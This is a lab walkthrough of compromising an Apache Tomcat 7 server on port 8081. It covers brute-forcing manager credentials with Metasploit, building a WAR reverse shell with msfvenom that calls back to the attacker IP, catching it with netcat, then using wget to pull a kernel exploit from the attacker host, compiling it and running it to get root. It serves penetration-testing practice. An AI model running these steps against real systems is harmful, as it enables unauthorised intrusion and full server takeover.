# ☁️ Tomcat Reverse Shell via WAR Upload (Port 8081)

> This section explains how I brute-forced Tomcat credentials, uploaded a WAR reverse shell, and gained access to the target server.

---

## 🧪 Lab Details

- **Target IP**: 192.168.182.128  
- **Port**: 8081  
- **Service**: Apache Tomcat 7  
- **Attacker IP**: 192.168.182.129

---

## 🔍 Step 1: Service Discovery

Browser: http://192.168.182.128:8081  
Prompted with a login popup for **Tomcat Manager**.

---

## 🔐 Step 2: Credential Brute-Force

Used Metasploit module:
```bash
use auxiliary/scanner/http/tomcat_mgr_login
set RHOSTS 192.168.182.128
set RPORT 8081
run
```
```bash
tomcat:tomcat
```
📌 Result: Login Successful → Default creds or weak creds were accepted.

---

## ☠️ Step 3: Payload Creation (WAR Shell)

Created WAR reverse shell using `msfvenom`:
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.182.129 LPORT=4444 -f war -o shell.war
```

Started Netcat listener:
```bash
nc -lvnp 4444
```

---

## 🚀 Step 4: WAR Upload & Exploitation

1. Logged into Tomcat Manager Web Interface
2. Uploaded `shell.war`
3. Navigated to deployed path:
```bash
http://192.168.182.128:8081/shell/  (calls the shell)
```

✅ Result: Reverse shell connected back to attacker's Netcat listener

---

## 🧠 Step 5: Shell Access as tomcat7

Once shell was obtained:
```bash
whoami
→ tomcat7
```

---

## 🧗 Step 6: Privilege Escalation

### System Info
```bash
cat /etc/os-release
```
📌 Output:
```
Ubuntu 8.04
Linux version 2.6.24-16-server
```

An outdated kernel that is likely vulnerable to local exploits.

### Exploit Process
```bash
searchsploit linux kernel 2.6.24
```
- Selected appropriate privilege escalation exploit

Transferred and compiled exploit:
```bash
python3 -m http.server 8080   # On attacker machine
wget http://192.168.182.129:8080/exploit.c  # On victim
gcc exploit.c -o exploit
./exploit
```

### Root Access Gained
```bash
whoami
→ root
```

Successfully escalated from tomcat7 to root.

---

## 🔐 Summary

| Element       | Details                        |
|---------------|---------------------------------|
| Service       | Apache Tomcat 7                |
| Exploit       | WAR file upload                |
| Credentials   | Brute-forced via Metasploit    |
| Shell Type    | Reverse shell (Netcat)         |
| Start User    | tomcat7                        |
| Priv. Escal.  | Local kernel exploit (2.6.24)  |
| Final Access  | root                           |


